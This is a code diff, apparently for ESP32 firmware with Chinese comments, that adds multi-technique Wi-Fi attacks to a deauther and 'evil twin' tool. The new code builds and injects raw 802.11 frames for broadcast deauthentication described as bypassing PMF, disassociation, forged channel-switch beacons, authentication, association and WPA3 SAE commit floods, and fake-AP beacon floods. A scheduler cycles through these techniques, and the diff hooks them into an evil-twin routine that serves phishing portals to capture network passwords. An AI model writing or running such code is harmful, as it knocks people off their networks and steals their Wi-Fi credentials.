@@ -339,6 +339,20 @@ static void addCredential(const String &clientIp, const String &pass) {
 }
 
 /* ---------------- 2. 取消认证器 (Deauther 真实帧注入) ---------------- */
+// 攻击技术位掩码: 主攻击模式与组合攻击都归一到同一张掩码, 引擎按位轮询发送。
+enum : uint16_t {
+  ATK_DEAUTH      = 1 << 0,  // 解除认证帧 (广播 = PMF 绕过: 组地址管理帧无 PMF 保护)
+  ATK_DISASSOC    = 1 << 1,  // 取消关联帧
+  ATK_CSA         = 1 << 2,  // CSA 信道欺骗 (伪造信标 + Spectrum Mgmt Action)
+  ATK_TPC_CSA     = 1 << 3,  // 信标操作: TPC(35) + CSA(37) 双 IE, 只发信标不踢线
+  ATK_AUTH_FLOOD  = 1 << 4,  // 认证泛洪 (随机源 MAC 的 Open System Auth)
+  ATK_ASSOC_FLOOD = 1 << 5,  // 关联泛洪 (随机源 MAC 的 Assoc Request)
+  ATK_SAE_FLOOD   = 1 << 6,  // WPA3 SAE 泛洪 (Auth alg=3 Commit)
+  ATK_BCAST       = 1 << 7,  // 广播泛洪 (广播数据帧灌流)
+  ATK_BEACON      = 1 << 8,  // 信标泛洪 (随机 SSID/BSSID 假 AP)
+};
+static const uint8_t ATK_TECH_COUNT = 9;
+
 struct DeauthEngine {
   bool running = false;
   String targetBssid = "";
@@ -366,6 +380,16 @@ struct DeauthEngine {
   uint8_t csaActionLen = 0;
   uint32_t csaCount = 0;
   uint8_t csaNewChannel = 1;   // 让客户端切去的假信道
+  // —— 主攻击模式 / 组合攻击 / 持续时间 (参考攻击面板) ——
+  // 主攻击模式: 0=PMF 绕过·全设备踢线, 1=按加密分流, 2=不使用主攻击 (只跑组合)
+  uint8_t  primaryMode = 0;
+  uint16_t comboMask = 0;      // 组合攻击位掩码 (ATK_*)
+  uint8_t  comboIndex = 0;     // 技术轮询游标
+  uint8_t  techCursor = 0;     // 最近一次发出的技术 (状态显示用)
+  uint32_t techCount[ATK_TECH_COUNT] = {0};  // 各技术成功发送计数
+  uint32_t durationMs = 0;     // 0 = 不限时
+  uint32_t stopAt = 0;         // 运行期绝对截止时刻
+  uint32_t startedAt = 0;
 };
 static DeauthEngine sDeauth;
 
@@ -415,6 +439,109 @@ static bool buildDeauthFrameRaw(const String &bssidIn, uint8_t reason, uint8_t *
 
 static void buildDeauthFrame(DeauthEngine &d) {
   d.frameReady = buildDeauthFrameRaw(d.targetBssid, d.reasonCode, d.frame);
+}
+
+// —— 组合攻击用的附加帧构造 (全部为真实 802.11 管理/数据帧) ——
+// 随机源 MAC: 置 locally administered 位, 避免与真实厂商 OUI 冲突。
+static void fillRandomMac(uint8_t mac[6]) {
+  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)(esp_random() & 0xFF);
+  mac[0] = (uint8_t)((mac[0] & 0xFC) | 0x02);
+}
+
+// 取消关联帧 (Subtype=10): 与 Deauth 等价的断链帧, 部分客户端只处理其中一种。
+static bool buildDisassocFrameRaw(const String &bssidIn, uint8_t reason, uint8_t *f) {
+  uint8_t mac[6];
+  String bssid = bssidIn;
+  bssid.trim();
+  if (!parseBssid(bssid, mac)) return false;
+  static const uint8_t BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+  f[0] = 0xA0; f[1] = 0x00;               // 管理 / Disassociation
+  f[2] = 0x3A; f[3] = 0x01;
+  memcpy(f + 4,  BROADCAST, 6);
+  memcpy(f + 10, mac, 6);
+  memcpy(f + 16, mac, 6);
+  f[22] = 0x00; f[23] = 0x00;             // 序列号由系统填充
+  f[24] = reason & 0xFF; f[25] = 0x00;
+  return true;
+}
+
+// 认证帧 (Subtype=11, Open System) —— 泛洪用: 大量随机客户端同时请求认证。
+static uint16_t buildAuthFloodFrame(const uint8_t bssid[6], uint8_t *f) {
+  uint8_t src[6];
+  fillRandomMac(src);
+  f[0] = 0xB0; f[1] = 0x00;
+  f[2] = 0x3A; f[3] = 0x01;
+  memcpy(f + 4,  bssid, 6);      // Address 1: AP
+  memcpy(f + 10, src, 6);        // Address 2: 随机客户端
+  memcpy(f + 16, bssid, 6);      // Address 3: BSSID
+  f[22] = 0x00; f[23] = 0x00;
+  f[24] = 0x00; f[25] = 0x00;    // Auth Algorithm: Open System
+  f[26] = 0x01; f[27] = 0x00;    // Auth SEQ: 1
+  f[28] = 0x00; f[29] = 0x00;    // Status: 0
+  return 30;
+}
+
+// WPA3 SAE Commit (Auth Algorithm=3, SEQ=1): 随机 scalar/element, AP 必须做椭圆曲线
+// 运算后才发现无效 —— 高帧率发送可把 AP 的 SAE 运算资源打满。
+static uint16_t buildSaeCommitFrame(const uint8_t bssid[6], uint8_t *f) {
+  uint8_t src[6];
+  fillRandomMac(src);
+  uint16_t i = 0;
+  f[i++] = 0xB0; f[i++] = 0x00;
+  f[i++] = 0x3A; f[i++] = 0x01;
+  memcpy(f + i, bssid, 6); i += 6;   // Address 1: AP
+  memcpy(f + i, src, 6);   i += 6;   // Address 2: 随机客户端
+  memcpy(f + i, bssid, 6); i += 6;   // Address 3: BSSID
+  f[i++] = 0x00; f[i++] = 0x00;      // Sequence Control
+  f[i++] = 0x03; f[i++] = 0x00;      // Auth Algorithm: SAE
+  f[i++] = 0x01; f[i++] = 0x00;      // Auth SEQ: Commit
+  f[i++] = 0x00; f[i++] = 0x00;      // Status: 0
+  f[i++] = 0x13; f[i++] = 0x00;      // Group: 19 (P-256)
+  for (int k = 0; k < 32; k++) f[i++] = (uint8_t)(esp_random() & 0xFF);  // Scalar
+  for (int k = 0; k < 64; k++) f[i++] = (uint8_t)(esp_random() & 0xFF);  // Element
+  return i;
+}
+
+// 关联请求 (Subtype=0): 认证泛洪的后续阶段, 让 AP 分配 AID/建表。
+static uint16_t buildAssocReqFrame(const uint8_t bssid[6], const String &ssidIn, uint8_t *f) {
+  static const uint8_t RATES[8] = {0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
+  uint8_t src[6];
+  fillRandomMac(src);
+  uint16_t i = 0;
+  f[i++] = 0x00; f[i++] = 0x00;      // 管理 / Association Request
+  f[i++] = 0x3A; f[i++] = 0x01;
+  memcpy(f + i, bssid, 6); i += 6;   // Address 1: AP
+  memcpy(f + i, src, 6);   i += 6;   // Address 2: 随机客户端
+  memcpy(f + i, bssid, 6); i += 6;   // Address 3: BSSID
+  f[i++] = 0x00; f[i++] = 0x00;      // Sequence Control
+  f[i++] = 0x11; f[i++] = 0x04;      // Capability: ESS + Privacy + ShortSlot
+  f[i++] = 0x0A; f[i++] = 0x00;      // Listen Interval
+  String ssid = ssidIn.length() ? ssidIn : String("probe");
+  if (ssid.length() > 32) ssid = ssid.substring(0, 32);
+  f[i++] = 0x00; f[i++] = (uint8_t)ssid.length();
+  for (size_t k = 0; k < ssid.length(); k++) f[i++] = (uint8_t)ssid[k];
+  f[i++] = 0x01; f[i++] = 0x08;
+  for (int k = 0; k < 8; k++) f[i++] = RATES[k];
+  return i;
+}
+
+// 广播数据帧 (Subtype=8 Data): LLC/SNAP + 随机载荷, 用于占满空口/干扰客户端。
+static uint16_t buildBroadcastDataFrame(const uint8_t bssid[6], uint8_t *f) {
+  static const uint8_t BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+  static const uint8_t SNAP[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00};
+  uint8_t src[6];
+  fillRandomMac(src);
+  uint16_t i = 0;
+  f[i++] = 0x08; f[i++] = 0x01;      // Data, ToDS=0/FromDS=0
+  f[i++] = 0x00; f[i++] = 0x00;
+  memcpy(f + i, BROADCAST, 6); i += 6;
+  memcpy(f + i, src, 6);       i += 6;
+  memcpy(f + i, bssid, 6);     i += 6;
+  f[i++] = 0x00; f[i++] = 0x00;
+  memcpy(f + i, SNAP, 8); i += 8;
+  const uint8_t pay = (uint8_t)(32 + (esp_random() % 33));   // 32..64 字节随机载荷
+  for (uint8_t k = 0; k < pay; k++) f[i++] = (uint8_t)(esp_random() & 0xFF);
+  return i;
 }
 
 /* ---------------- 双频信道模型 (P0: 5GHz 仅 C5) ----------------
@@ -585,6 +712,14 @@ static uint16_t buildCsaBeaconFrame(const String &ssidIn, const String &bssidIn,
   return buildBeaconFrameEx(ssidIn, bssidIn, curCh, true, csaIe, sizeof(csaIe), f);
 }
 
+// TPC(35)+CSA(37) 双 IE 信标: 参考面板的「信标操作」——只改客户端对信道/功率的认知,
+// 不直接断链 (伪装成 AP 正在调功率并迁移信道)。
+static uint16_t buildTpcCsaBeacon(const String &ssidIn, const String &bssidIn,
+                                  uint8_t curCh, uint8_t newCh, uint8_t *f) {
+  const uint8_t ies[8] = {0x23, 0x01, 0x00, 0x25, 0x03, 0x01, newCh, 0x01};
+  return buildBeaconFrameEx(ssidIn, bssidIn, curCh, true, ies, sizeof(ies), f);
+}
+
 // Spectrum Management CSA Action 帧 (Category 0 / Action 4) —— 部分客户端只认 Action 形式
 static uint8_t buildCsaActionFrame(const String &bssidIn, uint8_t newCh, uint8_t *f) {
   uint8_t mac[6];
@@ -616,6 +751,152 @@ static bool csaPrepare(const String &ssid, const String &bssid, uint8_t curCh) {
   sDeauth.csaBeaconLen = buildCsaBeaconFrame(ssid, bssid, curCh, newCh, sDeauth.csaBeacon);
   sDeauth.csaActionLen = buildCsaActionFrame(bssid, newCh, sDeauth.csaAction);
   return sDeauth.csaBeaconLen > 0;
+}
+
+/* ---------------- 攻击技术调度 (参考面板: 主攻击模式 + 组合攻击) ----------------
+ * 主攻击模式决定基础技术集合, 组合攻击在其之上追加; 两者合并成位掩码后按位轮询,
+ * 每个发送周期换一种技术 —— 只用一个发送节奏, 避免多定时器争抢射频。 */
+// 组合攻击参数: 接受位掩码整数, 或逗号分隔的技术名 (deauth,disassoc,csa,tpc,auth,assoc,sae,bcast,beacon)
+static uint16_t parseComboMask(const String &v) {
+  String s = v;
+  s.trim();
+  if (s.length() == 0) return 0;
+  bool numeric = true;
+  for (size_t i = 0; i < s.length(); i++) {
+    if (!isdigit((unsigned char)s[i])) { numeric = false; break; }
+  }
+  if (numeric) return (uint16_t)s.toInt();
+  uint16_t mask = 0;
+  int start = 0;
+  while (start <= (int)s.length()) {
+    int comma = s.indexOf(',', start);
+    if (comma < 0) comma = (int)s.length();
+    String t = s.substring(start, comma);
+    t.trim();
+    t.toLowerCase();
+    if (t == "deauth") mask |= ATK_DEAUTH;
+    else if (t == "disassoc") mask |= ATK_DISASSOC;
+    else if (t == "csa") mask |= ATK_CSA;
+    else if (t == "tpc" || t == "tpc+csa") mask |= ATK_TPC_CSA;
+    else if (t == "auth") mask |= ATK_AUTH_FLOOD;
+    else if (t == "assoc") mask |= ATK_ASSOC_FLOOD;
+    else if (t == "sae") mask |= ATK_SAE_FLOOD;
+    else if (t == "bcast") mask |= ATK_BCAST;
+    else if (t == "beacon") mask |= ATK_BEACON;
+    start = comma + 1;
+  }
+  return mask;
+}
+
+static uint16_t deauthTechMask() {
+  uint16_t mask = 0;
+  switch (sDeauth.primaryMode) {
+    case 1: {  // 按加密分流 · 按加密套件选向量
+      String a = sTarget.auth;
+      a.toUpperCase();
+      if (a.indexOf("WPA3") >= 0 || a.indexOf("SAE") >= 0) mask |= ATK_SAE_FLOOD | ATK_DEAUTH;
+      else if (a.indexOf("WPA") >= 0) mask |= ATK_DEAUTH | ATK_DISASSOC;
+      else mask |= ATK_DISASSOC | ATK_AUTH_FLOOD;   // 开放网络: 泛洪为主
+      break;
+    }
+    case 2:  // 不使用主攻击 · 只发组合攻击
+      break;
+    default: // 0 = PMF 绕过 · 全设备踢线 (组地址管理帧不受 PMF 保护)
+      mask |= ATK_DEAUTH;
+      break;
+  }
+  return (uint16_t)(mask | sDeauth.comboMask);
+}
+
+static const char *atkTechName(uint8_t bit) {
+  switch (bit) {
+    case 0: return "deauth";
+    case 1: return "disassoc";
+    case 2: return "csa";
+    case 3: return "tpc+csa";
+    case 4: return "auth-flood";
+    case 5: return "assoc-flood";
+    case 6: return "sae-flood";
+    case 7: return "bcast-flood";
+    case 8: return "beacon-flood";
+    default: return "-";
+  }
+}
+
+// 发送一种技术的一帧; 返回 ESP_OK 表示驱动接受 (总线成功率/错误码仍由调用方记录)。
+static esp_err_t deauthSendTech(uint16_t tech) {
+  static uint8_t buf[256];
+  uint8_t bssid[6];
+  if (!parseBssid(sDeauth.targetBssid, bssid)) return ESP_ERR_INVALID_ARG;
+  const uint8_t curCh = apChannelActive ? apChannelActive : sDeauth.targetChannel;
+  int len = 0;
+  switch (tech) {
+    case ATK_DEAUTH:
+      if (!sDeauth.frameReady) return ESP_ERR_INVALID_ARG;
+      return wifi80211Tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
+    case ATK_DISASSOC:
+      if (!buildDisassocFrameRaw(sDeauth.targetBssid, 1, buf)) return ESP_ERR_INVALID_ARG;
+      len = 26;
+      break;
+    case ATK_CSA: {   // 伪造 CSA 信标 + Action, 让客户端跟随切信道
+      bool ok = false;
+      esp_err_t last = ESP_FAIL;
+      if (sDeauth.csaBeaconLen) {
+        last = wifi80211Tx(WIFI_IF_AP, sDeauth.csaBeacon, (int)sDeauth.csaBeaconLen, true);
+        ok = (last == ESP_OK);
+      }
+      if (sDeauth.csaActionLen) {
+        esp_err_t e2 = wifi80211Tx(WIFI_IF_AP, sDeauth.csaAction, (int)sDeauth.csaActionLen, true);
+        if (!ok) last = e2;
+      }
+      return ok ? ESP_OK : last;
+    }
+    case ATK_TPC_CSA: {
+      String ssid = sTarget.ssid.length() ? sTarget.ssid : sDeauth.targetBssid;
+      len = (int)buildTpcCsaBeacon(ssid, sDeauth.targetBssid, curCh, sDeauth.csaNewChannel, buf);
+      if (!len) return ESP_ERR_INVALID_ARG;
+      break;
+    }
+    case ATK_AUTH_FLOOD:
+      len = (int)buildAuthFloodFrame(bssid, buf);
+      break;
+    case ATK_ASSOC_FLOOD: {
+      String ssid = sTarget.ssid.length() ? sTarget.ssid : String("probe");
+      len = (int)buildAssocReqFrame(bssid, ssid, buf);
+      break;
+    }
+    case ATK_SAE_FLOOD:
+      len = (int)buildSaeCommitFrame(bssid, buf);
+      break;
+    case ATK_BCAST:
+      len = (int)buildBroadcastDataFrame(bssid, buf);
+      break;
+    case ATK_BEACON: {   // 随机 SSID/BSSID 的开放假 AP
+      char ssid[16];
+      snprintf(ssid, sizeof(ssid), "Free-%04X", (unsigned)(esp_random() & 0xFFFF));
+      uint8_t m[6];
+      fillRandomMac(m);
+      char bs[18];
+      snprintf(bs, sizeof(bs), "%02X:%02X:%02X:%02X:%02X:%02X",
+               m[0], m[1], m[2], m[3], m[4], m[5]);
+      len = (int)buildBeaconFrameEx(String(ssid), String(bs), curCh, false, nullptr, 0, buf);
+      if (!len) return ESP_ERR_INVALID_ARG;
+      break;
+    }
+    default:
+      return ESP_ERR_INVALID_ARG;
+  }
+  return wifi80211Tx(WIFI_IF_AP, buf, len, true);
+}
+
+// 轮询下一个启用的技术位 (返回 1<<bit, 0 = 没有可用技术)
+static uint16_t deauthNextTech(uint16_t mask) {
+  for (int k = 0; k < ATK_TECH_COUNT; k++) {
+    sDeauth.comboIndex = (uint8_t)((sDeauth.comboIndex + 1) % ATK_TECH_COUNT);
+    uint16_t bit = (uint16_t)(1u << sDeauth.comboIndex);
+    if (mask & bit) return bit;
+  }
+  return 0;
 }
 
 // 国家信道计划: 默认 "01"(world) 的 5G 可用信道极少 (不含 149-165), 对 5G 高信道做
@@ -2268,7 +2549,7 @@ static bool eviltwinStartAttack(String &err) {
   apChannelActive = (uint8_t)sTarget.channel;
   sEvilTwin.apCloned = true;
 
-  // 2) 自动启动对主目标的持续 Deauth (本机已在目标信道, channelMoved 保持 false)
+  // 2) 启动对主目标的攻击 (本机已在目标信道, channelMoved 保持 false)
   sDeauth.targetBssid   = sTarget.bssid;
   sDeauth.targetChannel = (uint8_t)sTarget.channel;
   buildDeauthFrame(sDeauth);
@@ -2276,22 +2557,38 @@ static bool eviltwinStartAttack(String &err) {
   sDeauth.restoreChannel = apChannel;
   sDeauth.txOk = false; sDeauth.lastTxErr = 0;
   sDeauth.csaMode = false; sDeauth.csaCount = 0; sDeauth.frameCount = 0;
-  // 先探测真 Deauth 是否可用 (白名单已覆盖, 正常为可用); 若仍被拒则切 CSA 强制下线
+  if (!sDeauth.frameReady) { err = "目标 BSSID 无效, 无法构造攻击帧"; return false; }
+  // 主攻击模式 + 组合攻击 → 技术位掩码
+  const uint16_t emask = deauthTechMask();
+  if (emask == 0) {
+    err = "未选择任何攻击技术: 请选择主攻击模式或至少一项组合攻击";
+    return false;
+  }
+  for (uint8_t k = 0; k < ATK_TECH_COUNT; k++) sDeauth.techCount[k] = 0;
+  sDeauth.comboIndex = 0;
+  sDeauth.techCursor = 0;
+  sDeauth.platformBlocked = false;
+  sDeauth.startedAt = millis();
+  sDeauth.stopAt = sDeauth.durationMs ? (sDeauth.startedAt + sDeauth.durationMs) : 0;
+  // 先探测真 Deauth 是否可用 (白名单已覆盖, 正常为可用); 若仍被拒则切 CSA 强制下线。
+  // 组合里不含 Deauth (例如「只发组合攻击」) 时无需探测, 直接开跑。
   csaPrepare(sTarget.ssid, sTarget.bssid, (uint8_t)sTarget.channel);
-  esp_err_t probe = ESP_FAIL;
-  if (sDeauth.frameReady) probe = wifi80211Tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
-  if (probe == ESP_OK) {
-    sDeauth.platformBlocked = false;
+  if (!(emask & ATK_DEAUTH)) {
     sDeauth.running = true;
   } else {
-    sDeauth.platformBlocked = true;
-    sDeauth.csaMode = (sDeauth.csaBeaconLen > 0 && sDeauth.frameReady);
-    sDeauth.running = sDeauth.csaMode;
-    if (sDeauth.csaMode) {
-      log("[deauth] 驱动拒绝 Deauth 帧 (err=" + String((int)probe) + ") → 改用 CSA 信道切换强制下线 (切至 ch" +
-          String(sDeauth.csaNewChannel) + ", WPA2 有效 / WPA3 PMF 无效)");
+    const esp_err_t probe = wifi80211Tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
+    if (probe == ESP_OK) {
+      sDeauth.running = true;
     } else {
-      log("[deauth] Deauth 被驱动拒绝且 CSA 构造失败 (SSID/BSSID 缺失)");
+      sDeauth.platformBlocked = true;
+      sDeauth.csaMode = (sDeauth.csaBeaconLen > 0);
+      sDeauth.running = sDeauth.csaMode;
+      if (sDeauth.csaMode) {
+        log("[deauth] 驱动拒绝 Deauth 帧 (err=" + String((int)probe) + ") → 改用 CSA 信道切换强制下线 (切至 ch" +
+            String(sDeauth.csaNewChannel) + ", WPA2 有效 / WPA3 PMF 无效)");
+      } else {
+        log("[deauth] Deauth 被驱动拒绝且 CSA 构造失败 (SSID/BSSID 缺失)");
+      }
     }
   }
   sDeauth.lastTxTime = millis(); sDeauth.lastLogTime = millis();
@@ -2548,6 +2845,12 @@ static void sendInfo() {
           ",\"count\":" + String(sDeauth.frameCount) +
           ",\"rate\":" + String(sDeauth.rateLimitMs ? (1000 / sDeauth.rateLimitMs) : 10) +
           ",\"channel\":" + String(sDeauth.targetChannel) +
+          ",\"mode\":" + String(sDeauth.primaryMode) +
+          ",\"combo\":" + String(sDeauth.comboMask) +
+          ",\"tech\":\"" + String(atkTechName(sDeauth.techCursor)) + "\"" +
+          ",\"duration\":" + String(sDeauth.durationMs / 1000) +
+          ",\"remain\":" + String((sDeauth.running && sDeauth.stopAt) ?
+                                   (int32_t)(sDeauth.stopAt - millis()) / 1000 : -1) +
           ",\"band\":" + String(isBand5G(sDeauth.targetChannel) ? 5 : 2) + "},";
   json += "\"handshake\":{\"capturing\":" + String(sHandshake.capturing ? "true" : "false") +
           ",\"captured\":" + String(sHandshake.captured ? "true" : "false") +
@@ -2790,6 +3093,13 @@ static void handleEvilTwinStart() {
     // 攻击准备 = 钓鱼门户模板 (1=固件升级 2=认证过期 3=网络拥堵重连)
     int tpl = extractJson(body, "template").toInt();
     if (tpl >= 1 && tpl <= 3) sEvilTwin.templateId = tpl;
+    // 参考面板的三项设置: 主攻击模式 / 组合攻击 / 持续时间
+    int mode = extractJson(body, "mode").toInt();
+    if (mode >= 0 && mode <= 2) sDeauth.primaryMode = (uint8_t)mode;
+    if (body.indexOf("\"combo\"") >= 0) sDeauth.comboMask = parseComboMask(extractJson(body, "combo"));
+    long dur = extractJson(body, "duration").toInt();
+    if (dur < 0) dur = 0;
+    sDeauth.durationMs = (uint32_t)dur * 1000UL;
   }
   if (ssid.length() > 32) {
     server.send(400, "application/json", "{\"ok\":false,\"error\":\"克隆 SSID 最长 32 字节\"}");
@@ -2815,7 +3125,9 @@ static void handleEvilTwinStart() {
   emitLabState("eviltwin", true);
   log("[eviltwin] 攻击已发起! 克隆热点=" + sEvilTwin.cloneSsid + " (开放无密码 @ch" +
       String(sTarget.channel) + (isBand5G((uint8_t)sTarget.channel) ? " 5G" : " 2.4G") +
-      "), 主目标持续 Deauth, 双子目标 " + String(twinCount()) + " 条" +
+      "), 主攻击=" + String(sDeauth.primaryMode) + " 组合掩码=0x" + String(sDeauth.comboMask, HEX) +
+      (sDeauth.durationMs ? (" 持续 " + String(sDeauth.durationMs / 1000) + "s") : String(" 不限时")) +
+      ", 双子目标 " + String(twinCount()) + " 条" +
       (sEvilTwin.hopEnabled ? " 已启用跳频轮播" : " (无有效条目, 仅 2.4G 单频段攻击)") +
       " — 等待目标设备接入并在门户输入密码");
   server.sendHeader("Access-Control-Allow-Origin", "*");
@@ -2823,6 +3135,9 @@ static void handleEvilTwinStart() {
               "{\"ok\":true,\"active\":true,\"cloneSsid\":\"" + jsonEscape(sEvilTwin.cloneSsid) +
               "\",\"apCloned\":true,\"channel\":" + String(sTarget.channel) +
               ",\"injected\":" + String(sDeauth.frameReady ? "true" : "false") +
+              ",\"mode\":" + String(sDeauth.primaryMode) +
+              ",\"combo\":" + String(sDeauth.comboMask) +
+              ",\"duration\":" + String(sDeauth.durationMs / 1000) +
               ",\"twinHop\":" + String(sEvilTwin.hopEnabled ? "true" : "false") +
               ",\"twins\":" + String(twinCount()) + "}");
 }
@@ -2915,11 +3230,33 @@ static void handleDeauthStart() {
     int rate = extractJson(body, "rate").toInt();
     if (rate >= 1 && rate <= 100) sDeauth.rateLimitMs = 1000 / rate;
     if (sDeauth.rateLimitMs == 0) sDeauth.rateLimitMs = 10;
+    // 主攻击模式 0=PMF绕过·全设备踢线 1=按加密分流 2=不使用主攻击(只跑组合)
+    int mode = extractJson(body, "mode").toInt();
+    if (mode >= 0 && mode <= 2) sDeauth.primaryMode = (uint8_t)mode;
+    if (body.indexOf("\"combo\"") >= 0) sDeauth.comboMask = parseComboMask(extractJson(body, "combo"));
+    // 持续时间: 秒, 0 = 不限时
+    long dur = extractJson(body, "duration").toInt();
+    if (dur < 0) dur = 0;
+    sDeauth.durationMs = (uint32_t)dur * 1000UL;
   }
   if (sDeauth.targetBssid.length() == 0 && sTarget.bssid.length()) {
     sDeauth.targetBssid = sTarget.bssid;
     sDeauth.targetChannel = sTarget.channel ? sTarget.channel : 6;
   }
+  // 技术集合为空 (不使用主攻击 且 未选组合) → 直接拒绝, 避免"启动成功但一帧不发"
+  const uint16_t techMask = deauthTechMask();
+  if (techMask == 0) {
+    server.sendHeader("Access-Control-Allow-Origin", "*");
+    server.send(400, "application/json",
+                "{\"ok\":false,\"error\":\"未选择任何攻击技术: 请选择主攻击模式或至少一项组合攻击\"}");
+    return;
+  }
+  for (uint8_t k = 0; k < ATK_TECH_COUNT; k++) sDeauth.techCount[k] = 0;
+  sDeauth.comboIndex = 0;
+  sDeauth.techCursor = 0;
+  sDeauth.platformBlocked = false;
+  sDeauth.startedAt = millis();
+  sDeauth.stopAt = sDeauth.durationMs ? (sDeauth.startedAt + sDeauth.durationMs) : 0;
   // 预构 Deauth 管理帧; BSSID 非法则不发送 (只报告, 不再空转计数)
   buildDeauthFrame(sDeauth);
   sDeauth.txOk = false;
@@ -2942,8 +3279,8 @@ static void handleDeauthStart() {
   syncPromiscuousEngine();
   csaPrepare(sTarget.ssid.length() ? sTarget.ssid : sDeauth.targetBssid,
              sDeauth.targetBssid, (uint8_t)sDeauth.targetChannel);
-  // 平台能力试探: 若驱动仍拒绝 Deauth(0xC0) → 自动降级为 CSA 强制下线 (兜底)
-  if (sDeauth.frameReady) {
+  // 平台能力试探: 仅在技术集合包含 Deauth 时探测; 被拒则自动降级为 CSA 强制下线 (兜底)
+  if (sDeauth.frameReady && (techMask & ATK_DEAUTH)) {
     const esp_err_t probe = wifi80211Tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
     sDeauth.platformBlocked = (probe != ESP_OK);
     sDeauth.txOk = (probe == ESP_OK);
@@ -2966,9 +3303,17 @@ static void handleDeauthStart() {
     }
   }
   emitLabState("deauth", true);
-  log("[deauth] 取消认证器已启动! " +
-      String(sDeauth.csaMode ? ("CSA 信道切换强制下线 (切至 ch" + String(sDeauth.csaNewChannel) + ")")
-                             : (sDeauth.frameReady ? "真实 Deauth 帧注入" : "目标 BSSID 无效, 无法注入")) +
+  // 技术掩码 → 可读名称, 便于日志对照参考面板
+  String techNames;
+  for (uint8_t k = 0; k < ATK_TECH_COUNT; k++) {
+    if (techMask & (1u << k)) {
+      if (techNames.length()) techNames += "+";
+      techNames += atkTechName(k);
+    }
+  }
+  log("[deauth] 取消认证器已启动! 技术=" + techNames +
+      (sDeauth.durationMs ? (" 持续 " + String(sDeauth.durationMs / 1000) + "s") : String(" 不限时")) +
+      (sDeauth.csaMode ? (" (Deauth 被拒 → CSA 信道切换 ch" + String(sDeauth.csaNewChannel) + ")") : "") +
       " 目标=" + sDeauth.targetBssid + " ch=" + String(sDeauth.targetChannel) + " 原因码=" + String(sDeauth.reasonCode) +
       (channelAligned ? " (已对齐目标: AP 信道切至 ch" + String(apChannelActive) + ", 已连设备将短暂掉线)" : "") +
       (channelMismatch ? " (信道对齐失败: 帧仍只能在 ch" + String(apChannelActive) + " 发出, 目标收不到)" : ""));
@@ -2976,6 +3321,10 @@ static void handleDeauthStart() {
   server.send(200, "application/json",
               "{\"ok\":true,\"running\":true,\"injected\":" + String(sDeauth.frameReady ? "true" : "false") +
               ",\"csa\":" + String(sDeauth.csaMode ? "true" : "false") +
+              ",\"mode\":" + String(sDeauth.primaryMode) +
+              ",\"combo\":" + String(sDeauth.comboMask) +
+              ",\"duration\":" + String(sDeauth.durationMs / 1000) +
+              ",\"tech\":\"" + techNames + "\"" +
               ",\"txChannel\":" + String(apChannelActive) +
               ",\"channelAligned\":" + String(channelAligned ? "true" : "false") +
               ",\"channelMismatch\":" + String(channelMismatch ? "true" : "false") + "}");
@@ -3033,6 +3382,19 @@ static void handleDeauthStatus() {
   { bool prom = false; esp_wifi_get_promiscuous(&prom);
     json += "\"promOn\":" + String(prom ? "true" : "false") + ","; }
   json += "\"txChannel\":" + String(apChannelActive) + ",";
+  json += "\"mode\":" + String(sDeauth.primaryMode) + ",";
+  json += "\"combo\":" + String(sDeauth.comboMask) + ",";
+  json += "\"tech\":\"" + String(atkTechName(sDeauth.techCursor)) + "\",";
+  json += "\"duration\":" + String(sDeauth.durationMs / 1000) + ",";
+  json += "\"elapsed\":" + String(sDeauth.running ? (millis() - sDeauth.startedAt) / 1000 : 0) + ",";
+  json += "\"remain\":" + String((sDeauth.running && sDeauth.stopAt) ?
+                                  (int32_t)(sDeauth.stopAt - millis()) / 1000 : -1) + ",";
+  json += "\"techCount\":[";
+  for (uint8_t k = 0; k < ATK_TECH_COUNT; k++) {
+    if (k) json += ",";
+    json += String(sDeauth.techCount[k]);
+  }
+  json += "],";
   json += "\"channelMoved\":" + String(sDeauth.channelMoved ? "true" : "false");
   json += "}";
   server.send(200, "application/json", json);
@@ -4750,24 +5112,45 @@ void loop() {
           wifi80211Tx(WIFI_IF_AP, sDeauth.csaAction, (int)sDeauth.csaActionLen, true);
         sDeauth.txOk = ok;
         if (ok) { sDeauth.csaCount++; sDeauth.frameCount++; }
-      } else if (sDeauth.frameReady) {
-        sDeauth.lastTxErr = wifi80211Tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
-        sDeauth.txOk = (sDeauth.lastTxErr == ESP_OK);
-        if (sDeauth.txOk) sDeauth.frameCount++;
-        else if (sDeauth.lastTxErr == 258 && !sDeauth.platformBlocked) {
-          // 自检测: C5 WiFi 库白名单拒绝 → 停止引擎 (否则驱动 unsupport frame type 刷屏且空转)
-          sDeauth.platformBlocked = true;
-          log("[deauth] 平台限制: 本芯片 WiFi 库拒绝 Deauth 帧注入 (错误码 258), 帧注入停用");
-          stopDeauthEngine();
+      } else {
+        // 主攻击模式 + 组合攻击: 按位轮询, 每个发送周期换一种技术
+        const uint16_t tech = deauthNextTech(deauthTechMask());
+        if (!tech) {
+          if (!sDeauth.platformBlocked) {
+            sDeauth.platformBlocked = true;
+            log("[deauth] 未选择任何可用攻击技术, 引擎停止");
+            stopDeauthEngine();
+          }
+        } else {
+          sDeauth.techCursor = sDeauth.comboIndex;
+          const esp_err_t e = deauthSendTech(tech);
+          sDeauth.lastTxErr = e;
+          sDeauth.txOk = (e == ESP_OK);
+          if (sDeauth.txOk) {
+            sDeauth.frameCount++;
+            sDeauth.techCount[sDeauth.comboIndex]++;
+          } else if (e == 258 && !sDeauth.platformBlocked) {
+            // 自检测: C5 WiFi 库白名单拒绝 → 停止引擎 (否则驱动 unsupport frame type 刷屏且空转)
+            sDeauth.platformBlocked = true;
+            log("[deauth] 平台限制: 本芯片 WiFi 库拒绝帧注入 (错误码 258), 帧注入停用");
+            stopDeauthEngine();
+          }
         }
       }
     }
   }
+  // 攻击持续时间到点自动停止 (0 = 不限时)
